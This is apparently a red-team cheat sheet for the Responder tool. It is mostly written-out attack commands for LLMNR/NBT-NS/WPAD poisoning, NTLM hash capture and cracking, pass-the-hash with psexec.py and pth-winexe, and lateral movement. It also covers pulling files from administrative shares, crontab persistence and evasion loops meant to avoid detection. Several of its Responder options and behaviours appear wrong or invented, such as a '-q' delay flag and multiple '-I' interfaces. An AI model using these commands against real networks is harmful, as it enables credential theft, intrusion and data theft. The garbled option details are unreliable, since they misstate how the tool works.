# Index
- [[Red Team/4. Tool Guides/0. Incomplete/Tool Guides]]

# Responder

Responder is a powerful tool used for conducting man-in-the-middle attacks and capturing credentials within a network. It is often used during penetration tests to exploit weaknesses in network protocols such as LLMNR, NBT-NS, and MDNS. This ultimate edition of the cheat sheet provides an exhaustive list of Responder commands, detailed explanations, and advanced usage scenarios.

## Basic Syntax
```bash
responder [options] -I <interface>
```

## Core Options
- `-I <interface>`: Specifies the network interface to use.
- `-A`: Analyzes the network and displays unique hostnames that have LLMNR, NBT-NS, or MDNS queries enabled.
- `-b`: Binds a specific interface to Responder.
- `-r`: Enables answers for NetBIOS wredir and SMB requests.
- `-d`: Disables answers for WINS queries.
- `-w`: Enables WPAD rogue proxy server.
- `-F`: Force NTLMv1 authentication.
- `-f`: Forces answers for Basic HTTP authentication.
- `-P`: Poisons LLMNR, NBT-NS, and MDNS queries.
- `-p`: Disables poisoning but still captures hashes and credentials.
- `-v`: Verbose mode; provides detailed information about network interactions.
- `-vvv`: Very verbose mode; provides maximum detail.
- `-l`: Enables logging to the specified file.
- `-e`: Sets the IP address for SMB and HTTP to listen on.
- `-u`: Sets the User-Agent for rogue WPAD proxy server.

# Commands and Use Cases

#### Basic Network Poisoning

1. **LLMNR, NBT-NS, and MDNS Poisoning**: The most basic usage of Responder, this command starts poisoning LLMNR, NBT-NS, and MDNS queries on the specified interface.
    ```bash
    responder -I <interface>
    ```
2. **Running Responder in Analysis Mode**: This command puts Responder in analysis mode, where it only listens for requests and displays unique hostnames without poisoning or responding.
    ```bash
    responder -I <interface> -A
    ```
3. **Enabling WPAD Rogue Proxy**: This command enables the rogue WPAD proxy, which can capture proxy credentials by tricking systems into using Responder as their proxy server.
    ```bash
    responder -I <interface> -w
    ```
4. **Capturing NTLMv1 Hashes**: Forces the downgrade of NTLMv2 to NTLMv1 for capturing weaker NTLMv1 hashes, which are easier to crack.
    ```bash
    responder -I <interface> -F
    ```
5. **Running Responder in Passive Mode**: This command runs Responder in passive mode, where it captures and logs all the hashes and credentials without poisoning or actively responding to queries.
    ```bash
    responder -I <interface> -p
    ```

#### Poisoning Techniques

1. **Selective Poisoning with Specific Interface Binding**: Binds Responder to a specific interface, which is useful in complex environments with multiple network interfaces.
    ```bash
    responder -I <interface> -b <interface>
    ```
2. **Disabling Specific Protocols**: Disables WINS query poisoning, allowing you to focus on LLMNR and NBT-NS without interference.
    ```bash
    responder -I <interface> -d
    ```
3. **Forcing Basic HTTP Authentication Responses**: Forces Responder to respond with Basic HTTP authentication challenges, potentially capturing credentials sent in plaintext.
    ```bash
    responder -I <interface> -f
    ```
4. **Specifying Listening IP Address for SMB and HTTP**:Sets a specific IP address for Responder to use when responding to SMB and HTTP requests, useful for controlling the flow of captured credentials.
    ```bash
    responder -I <interface> -e <target_ip>
    ```
 5. **Using Custom User-Agent for Rogue WPAD**:Configures a custom User-Agent string for the rogue WPAD proxy server, which can help bypass certain filters or defenses.
    ```bash
    responder -I <interface> -u "CustomUserAgent"
    ```
 
#### Credential Harvesting and Hash Cracking

1. **Capturing NTLMv2 Hashes**: The default operation mode of Responder captures NTLMv2 hashes from poisoned queries.
    ```bash
    responder -I <interface>
    ```
2. **Downgrading to NTLMv1 and Capturing**: Forces NTLMv1 downgrade, capturing weaker NTLMv1 hashes that are easier to crack.
    ```bash
    responder -I <interface> -F
    ```
3. **Cracking NTLM Hashes with John the Ripper**: Uses John the Ripper to crack NTLMv2 hashes captured by Responder.
    ```bash
    john --format=NTLMv2 responder-Session.log
    ```
4. **Cracking NTLM Hashes with Hashcat**: Uses Hashcat to crack NTLMv2 hashes with a specified wordlist.
    ```bash
    hashcat -m 5600 responder-Session.log <wordlist>
    ```
5. **Monitoring and Logging Credential Harvesting**: Runs Responder in verbose mode with logging enabled, useful for monitoring and auditing captured credentials.
    ```bash
    responder -I <interface> -v -l /path/to/logfile.log
    ```

#### Rogue Services Setup

1. **Setting Up a Rogue WPAD Proxy**: Starts a rogue WPAD proxy service that intercepts and captures proxy credentials.
    ```bash
    responder -I <interface> -w
    ```
2. **Customizing Rogue WPAD Responses**: Configures the WPAD proxy to respond with a custom User-Agent string, which can be used to mimic legitimate proxies or bypass defenses.
    ```bash
    responder -I <interface> -w -u "CustomUserAgent"
    ```
3. **Rogue SMB Server for Capturing Hashes**: Sets up a rogue SMB server that responds to SMB requests and captures the corresponding NTLM hashes.
    ```bash
    responder -I <interface> -r
    ```
4. **Customizing SMB and HTTP Listening IP**: Configures the SMB and HTTP servers to listen on a specified IP address, which can be useful for targeted attacks.
    ```bash
    responder -I <interface> -e <target_ip>
    ```
5. **Rogue DNS and HTTP Authentication**: Forces Basic HTTP authentication and rogue DNS responses, capturing credentials sent in response to these services.
    ```bash
    responder -I <interface> -f -e <target_ip>
    ```

#### Evasion Techniques

1. **Running Responder in Stealth Mode**: Operates in passive mode, capturing credentials without actively poisoning the network, reducing the chance of detection.
    ```bash
    responder -I <interface> -p
    ```
2. **Using Custom User-Agent for Stealth**: Deploys a custom User-Agent string to avoid detection by systems looking for default User-Agent values from Responder.
    ```bash
    responder -I <interface> -u "CustomUserAgent"
    ```
3. **Bypassing Network Monitoring with Selective Responses**: Configures Responder to only respond to specific queries (e.g., SMB) while disabling others, making it harder to detect.
    ```bash
    responder -I <interface> -r -d -w -e <target_ip>
    ```
4. **Rotating IP Addresses for Response**: Rotates the IP address used for poisoning, making it more difficult for defenders to pin down the attack.
    ```bash
    while true; do
      responder -I <interface> -e $(shuf -n 1 -i 192.168.1.100-192.168.1.200)
      sleep 10
    done
    ```
5. **Using Delays to Avoid Detection**: Introduces a delay before responding to queries, which can help avoid detection by making the attack less aggressive.
    ```bash
    responder -I <interface> -w -e <target_ip> -p -q 5
    ```

#### Post-Exploitation Techniques

1. **Capturing Browser-Based Authentication**: Combines Basic HTTP authentication with WPAD poisoning to capture browser-based credentials.
    ```bash
    responder -I <interface> -f -w
    ```
2. **Pivoting with Captured Credentials**: Uses credentials captured by Responder to pivot into other systems via SMB.
    ```bash
    smbclient -L <target_ip> -U "DOMAIN\captured_user%captured_password"
    ```
3. **Harvesting Credentials from Multiple Interfaces**: Captures credentials across multiple network interfaces, useful in environments with complex network segmentation.
    ```bash
    responder -I <interface1> -I <interface2> -r
    ```
4. **Using Responder with Metasploit**: Integrates Responder with Metasploit to capture and utilize SMB credentials within the Metasploit framework.
    ```bash
    msfconsole
    use auxiliary/server/capture/smb
    set INTERFACE <interface>
    run
    ```
5. **Combining Responder with Other Tools**: Runs Responder in conjunction with MITM6, an IPv6-based attack tool, to enhance credential harvesting capabilities by exploiting different protocols simultaneously.
    ```bash
    responder -I <interface> -w &
    mitm6 -i <interface> -d <domain>
    ```

## Penetration Testing Techniques

#### External Reconnaissance

Responder can be used during external reconnaissance to gather information about the network environment, identify potential targets, and collect credentials.

1. **Identifying LLMNR and NBT-NS Enabled Networks**: Uses Responder in analysis mode to identify networks where LLMNR and NBT-NS are enabled, highlighting potential attack surfaces.
    ```bash
    responder -I <interface> -A
    ```
2. **Fingerprinting Network Services**: Runs Responder in verbose mode to capture detailed information about the types of queries being made on the network, aiding in service fingerprinting.
    ```bash
    responder -I <interface> -v
    ```
3. **Network Enumeration via WPAD**: Uses WPAD poisoning to trick devices into connecting through Responder, revealing information about the internal network structure.
    ```bash
    responder -I <interface> -w
    ```
4. **Identifying High-Value Targets**: Analyzes responses to SMB and HTTP poisoning to identify high-value targets based on the types of credentials being captured.
    ```bash
    responder -I <interface> -r
    ```
5. **Mapping Network Vulnerabilities**: Logs all captured data in extreme verbosity, allowing for detailed post-analysis to map out network vulnerabilities.
    ```bash
    responder -I <interface> -vvv -l /path/to/logfile.log
    ```

#### Initial Access

Responder is frequently used to gain initial access to a network by capturing credentials that can be leveraged to authenticate to systems.

1. **Capturing Domain Credentials**: The basic Responder setup is often sufficient to capture domain credentials via poisoned LLMNR and NBT-NS queries.
    ```bash
    responder -I <interface>
    ```
2. **Leveraging Captured Hashes for Access**: Uses captured NTLM hashes to execute commands on remote systems via SMB.
    ```bash
    psexec.py DOMAIN/username@target_ip -hashes :captured_hash
    ```
3. **Exploiting Weak Protocols**: Forces NTLMv1 authentication, capturing weaker hashes that can be cracked and used to gain access.
    ```bash
    responder -I <interface> -F
    ```
4. **Initial Pivot with Captured WPAD Credentials**: Uses captured WPAD credentials to pivot into web-based resources within the network.
    ```bash
    curl -x http://captured_user:captured_password@target_ip/ http://target_resource
    ```
5. **Establishing a Foothold with Captured SMB Hashes**: Accesses administrative shares using captured SMB credentials, establishing a foothold within the network.
    ```bash
    smbclient //target_ip/c$ -U "DOMAIN\captured_user%captured_password"
    ```

#### Persistence

After gaining access, Responder can be used to maintain persistence within the network by continually harvesting new credentials and monitoring network traffic.

1. **Continual Credential Harvesting**: Operates in passive mode, continually capturing hashes and credentials without actively poisoning the network.
    ```bash
    responder -I <interface> -p -v
    ```
2. **Reinforcing WPAD Poisoning**: Combines WPAD and SMB poisoning to capture credentials from different protocols, maintaining a presence on the network.
    ```bash
    responder -I <interface> -w -r
    ```
3. **Automated Persistence with Scheduled Tasks**: Schedules Responder to start on boot, ensuring it continues capturing credentials even after a system restart.
    ```bash
    echo "@reboot /usr/local/bin/responder -I <interface> -w" | crontab -
    ```
4. **Using Multiple Interfaces for Redundancy**: Runs Responder across multiple network interfaces, ensuring persistence across different network segments.
    ```bash
    responder -I <interface1> -I <interface2> -p
    ```
5. **Stealthy Monitoring and Credential Harvesting**: Introduces delays and runs in passive mode to reduce the risk of detection while continuously monitoring the network.
    ```bash
    responder -I <interface> -q 10 -p
    ```

#### Privilege Escalation

Responder can assist in escalating privileges by capturing credentials that can be used to access higher-privileged accounts or systems.

1. **Capturing Administrator Credentials**: WPAD poisoning is particularly effective at capturing high-privilege credentials as users' browsers are tricked into authenticating.
    ```bash
    responder -I <interface> -w
    ```
2. **Using Captured Credentials for Lateral Movement**: Uses captured credentials to move laterally through the network and escalate privileges on other systems.
    ```bash
    crackmapexec smb target_ip -u captured_user -p captured_password --local-auth
    ```
3. **Exploiting Captured NTLM Hashes**: Captures and cracks NTLMv1 hashes, which can then be used to escalate privileges by authenticating to more critical systems.
    ```bash
    responder -I <interface> -F
    john --format=NTLMv1 responder-Session.log
    ```
4. **Leveraging Captured Hashes for Pass-the-Hash Attacks**: Executes commands on a remote system using captured NTLM hashes, effectively escalating privileges.
    ```bash
    pth-winexe -U 'captured_user%captured_hash' //target_ip cmd.exe
    ```
5. **Harvesting Credentials for Privilege Escalation**: Runs Responder in verbose mode with detailed logging to capture as many credentials as possible for later use in privilege escalation.
    ```bash
    responder -I <interface> -v -l /path/to/logfile.log
    ```

#### Lateral Movement, Pivoting, and Tunneling

Responder facilitates lateral movement and pivoting by capturing credentials that can be used to access additional systems and networks.

1. **Using Captured Credentials for Lateral Movement**: Leverages captured SMB credentials to move laterally within the network, accessing other systems.
    ```bash
    responder -I <interface> -r
    crackmapexec smb target_ip -u captured_user -p captured_password --local-auth
    ```
2. **Pivoting with Captured WPAD Credentials**: Uses WPAD-captured credentials to pivot into different parts of the network, accessing internal resources.
    ```bash
    curl -x http://captured_user:captured_password@target_ip/ http://internal_resource
    ```
3. **Tunneling Through Compromised Systems**: Uses SSH tunneling to route traffic through a compromised system, effectively pivoting to another network segment.
    ```bash
    ssh -L local_port:target_ip:remote_port captured_user@compromised_ip
    ```
4. **Combining Responder with Other Tools for Lateral Movement**: Runs Responder in conjunction with MITM6 to exploit different protocols and move laterally within the network.
    ```bash
    responder -I <interface> -w &
    mitm6 -i <interface> -d <domain>
    ```
5. **Exploiting Captured NTLM Hashes for Pivoting**: Uses captured NTLM hashes to execute commands on other systems, enabling further pivoting within the network.
    ```bash
    psexec.py DOMAIN/captured_user@target_ip -hashes :captured_hash
    ```

#### Defense Evasion

Responder can be configured to evade detection, making it a stealthy tool for credential harvesting and network attacks.

1. **Running Responder in Stealth Mode**: Captures credentials without actively poisoning the network, reducing the risk of detection.
    ```bash
    responder -I <interface> -p
    ```
2. **Using Custom User-Agent for Evasion**: Uses a custom User-Agent string to avoid detection by systems that look for default Responder signatures.
    ```bash
    responder -I <interface> -u "CustomUserAgent"
    ```
3. **Selective Poisoning to Avoid Detection**: Disables WINS poisoning while still capturing SMB and HTTP credentials, making the attack less obvious.
    ```bash
    responder -I <interface> -r -d
    ```
4. **Rotating IP Addresses to Evade Detection**: Changes the IP address used by Responder periodically, making it more difficult for defenders to detect and block the attack.
    ```bash
    while true; do
      responder -I <interface> -e $(shuf -n 1 -i 192.168.1.100-192.168.1.200)
      sleep 10
    done
    ```
5. **Introducing Delays to Thwart Detection Mechanisms**: Adds delays between responses to avoid triggering IDS/IPS systems that monitor for rapid, repeated attacks.
    ```bash
    responder -I <interface> -q 5 -w
    ```

#### Data Exfiltration

While Responder is primarily a credential harvesting tool, it can also be used to aid in data exfiltration by capturing access credentials.

1. **Capturing Credentials for Data Exfiltration**: Combines SMB and WPAD poisoning to capture credentials that can be used to access and exfiltrate data from internal systems.
    ```bash
    responder -I <interface> -r -w
    ```
2. **Using Captured SMB Credentials for Exfiltration**: Accesses an administrative share to exfiltrate sensitive data using captured SMB credentials.
    ```bash
    smbclient //target_ip/c$ -U "captured_user%captured_password" -c "get sensitive_file.txt"
    ```
3. **Exfiltrating Data via HTTP with Captured WPAD Credentials**: Uses WPAD credentials to exfiltrate data over HTTP, often bypassing typical data loss prevention (DLP) measures.
    ```bash
    curl -x http://captured_user:captured_password@target_ip/ http://target_resource/sensitive_file.txt -o exfiltrated_data.txt
    ```
4. **Tunneling Data Exfiltration through a Compromised Host**: Routes data through a compromised system, making it harder to detect and block the exfiltration.
    ```bash
    ssh -L local_port:target_ip:remote_port captured_user@compromised_ip
    scp -P local_port exfiltrated_data.txt local_user@localhost:/safe_location
    ```
5. **Using Responder for Persistent Access and Continuous Data Exfiltration**: Runs Responder in passive mode to continually capture credentials, which can then be used for ongoing data exfiltration efforts.
    ```bash
    responder -I <interface> -p -v
    ```

# Resources

|**Name**|**URL**|
|---|---|
|Responder GitHub Repository|https://github.com/SpiderLabs/Responder|
|Responder Documentation|https://www.trustedsec.com/tools/responder/|
|Responder Usage Examples|https://0xdf.gitlab.io/2018/11/24/htb-really-exploiting-llmnr.html|
|Responder in Offensive Security|https://www.offensive-security.com/metasploit-unleashed/responder/|
|Responder with Mitm6|https://byt3bl33d3r.github.io/responder-mitm6-playbook.html|
|Mitigating Responder Attacks|https://medium.com/@drewgreenuk/how-to-block-responder-attacks-on-your-network-9e282c43a0e1|
|Responder Cheat Sheet|https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets/responder-cheat-sheet|
|Automating Responder for Red Teams|https://www.mdsec.co.uk/2018/02/automating-responder-with-powershell/|
|Defensive Countermeasures Against Responder|https://www.sans.org/blog/protecting-your-network-against-llmnr-nbtns-poisoning-attacks/|
|Responder and Hash Cracking|https://hashcat.net/forum/thread-7821.html|
|Using Responder in CTF Challenges|https://ctftime.org/writeups/overview/responder|
|Responder and Ethical Hacking|https://www.ethicalhacker.net/features/responder-attacks-defenses/|